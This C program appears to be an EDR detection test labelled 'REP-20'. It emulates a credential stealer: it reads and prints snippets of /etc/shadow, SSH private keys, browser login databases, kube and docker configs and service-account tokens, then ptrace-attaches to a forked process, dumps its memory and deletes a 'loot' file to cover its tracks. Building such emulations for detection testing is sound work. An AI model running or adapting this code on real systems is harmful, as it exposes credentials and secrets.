#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>

static const char *TARGETS[] = {
    "/etc/shadow", "/etc/shadow-", "/etc/gshadow", "/etc/passwd", "/etc/sudoers",
    "/root/.ssh/id_rsa", "/root/.ssh/id_ed25519", "/root/.ssh/id_ecdsa",
    "/root/.ssh/authorized_keys", "/root/.ssh/known_hosts",
    "/root/.bash_history", "/root/.zsh_history", "/home/vagrant/.bash_history",
    "/root/.netrc", "/root/.git-credentials",
    "/proc/keys", "/proc/key-users",
    "/root/.config/google-chrome/Default/Login Data",
    "/root/.mozilla/firefox/profiles.ini",
    "/root/.config/chromium/Default/Login Data",
    "/root/.kube/config", "/root/.docker/config.json",
    "/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/log/auth.log", "/var/log/secure",
    NULL
};

int main(void)
{
    signal(SIGALRM, SIG_DFL);
    alarm(30);

    printf("[REP-20] === LSASS-style memory and credential stealer ===\n");

    int n_targets = 0;
    for (; TARGETS[n_targets]; n_targets++);
    printf("[REP-20] Stage 1: credential file burst — %d target paths\n", n_targets);

    int harvested = 0, denied = 0;
    for (int i = 0; TARGETS[i] != NULL; i++) {
        int fd = open(TARGETS[i], O_RDONLY);
        if (fd >= 0) {
            char buf[128];
            ssize_t n = read(fd, buf, sizeof(buf) - 1);
            if (n > 0) {
                buf[n] = '\0';
                buf[strcspn(buf, "\n")] = '\0';
                printf("[REP-20] HARVESTED: %s — '%.*s...'\n", TARGETS[i], 40, buf);
            }
            close(fd);
            harvested++;
        } else {
            denied++;
        }
    }
    printf("[REP-20] Burst done: %d files read, %d denied (%d total openat kprobes)\n",
           harvested, denied, harvested + denied);

    printf("[REP-20] Stage 2: fork credential-holding victim process\n");
    pid_t victim = fork();
    if (victim == 0) {
        volatile char secret[128];
        snprintf((char *)secret, sizeof(secret),
                 "PASSWORD=hunter2 TOKEN=ghp_XXXXXXXXXXXXXXXX SESSION=abc123");
        for (int i = 0; i < 200; i++) usleep(10000);
        exit(0);
    }

    usleep(100000);

    printf("[REP-20] Stage 3: ptrace(PTRACE_ATTACH) PID=%d — "
           "fires ProcessInjection kprobe (101)\n", victim);

    if (ptrace(PTRACE_ATTACH, victim, NULL, NULL) == 0) {
        int st;
        waitpid(victim, &st, 0);
        printf("[REP-20] ptrace ATTACHED — victim stopped\n");

        char maps_path[64];
        snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", victim);
        FILE *maps = fopen(maps_path, "r");
        if (maps) {
            char line[256];
            unsigned long rstart = 0, rend = 0;
            while (fgets(line, sizeof(line), maps) && rstart == 0) {
                char perms[8];
                if (sscanf(line, "%lx-%lx %7s", &rstart, &rend, perms) == 3) {
                    if (perms[0] == 'r' && perms[3] == 'p'
                            && (rend - rstart) <= 65536)
                        break;
                    rstart = 0;
                }
            }
            fclose(maps);

            if (rstart > 0) {
                char mem_path[64];
                snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", victim);
                int memfd = open(mem_path, O_RDONLY);
                if (memfd >= 0) {
                    char dump[64] = {};
                    ssize_t n = pread(memfd, dump, sizeof(dump) - 1, (off_t)rstart);
                    close(memfd);
                    printf("[REP-20] Memory dump: %zd bytes from 0x%lx\n", n, rstart);
                }
            }
        }

        ptrace(PTRACE_DETACH, victim, NULL, NULL);
        printf("[REP-20] ptrace DETACHED — memory dump complete\n");
    } else {
        printf("[REP-20] ptrace failed: %s (kprobe still fired)\n", strerror(errno));
    }
    kill(victim, SIGKILL);
    waitpid(victim, NULL, 0);

    const char *loot = "/tmp/.sentinel_loot_rep20";
    FILE *f = fopen(loot, "w");
    if (f) {
        fprintf(f, "harvested=%d ptrace_victim=%d\n", harvested, victim);
        fclose(f);
        if (syscall(SYS_unlinkat, AT_FDCWD, loot, 0) == 0)
            printf("[REP-20] Cover tracks: unlinkat fired — loot file erased\n");
    }

    printf("[REP-20] Stealer chain complete: openat_burst+ptrace+mem_dump+unlinkat fired\n");
    return 0;
}
